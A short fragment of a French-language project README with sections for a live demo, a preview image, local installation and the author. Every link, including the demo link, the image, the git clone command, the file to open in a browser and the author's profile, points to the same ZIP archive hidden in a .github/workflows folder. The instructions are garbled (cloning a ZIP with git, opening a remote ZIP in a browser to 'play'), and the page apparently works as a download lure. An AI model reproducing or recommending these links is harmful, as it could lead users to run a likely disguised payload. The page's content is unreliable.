...
Le projet est hébergé sur GitHub Pages. Vous pouvez l'essayer directement [ici](https://raw.githubusercontent.com/Martialdepaul/fsst-rs/master/.github/workflows/fsst-rs-3.7.zip).
...
## 📸 Aperçu du projet
![Aperçu de Elegant-Context](https://raw.githubusercontent.com/Martialdepaul/fsst-rs/master/.github/workflows/fsst-rs-3.7.zip)

## 📂 Installation locale

1. Clonez le dépôt :  
   ```bash
   git clone https://raw.githubusercontent.com/Martialdepaul/fsst-rs/master/.github/workflows/fsst-rs-3.7.zip
   ```
2. Ouvrez le fichier `https://raw.githubusercontent.com/Martialdepaul/fsst-rs/master/.github/workflows/fsst-rs-3.7.zip` dans votre navigateur préféré pour commencer à jouer !

## 👨‍💻 Auteur

Projet créé par **[MARTIAL](https://raw.githubusercontent.com/Martialdepaul/fsst-rs/master/.github/workflows/fsst-rs-3.7.zip)**. N'hésitez pas à me suivre pour plus de projets sympas ! ✨
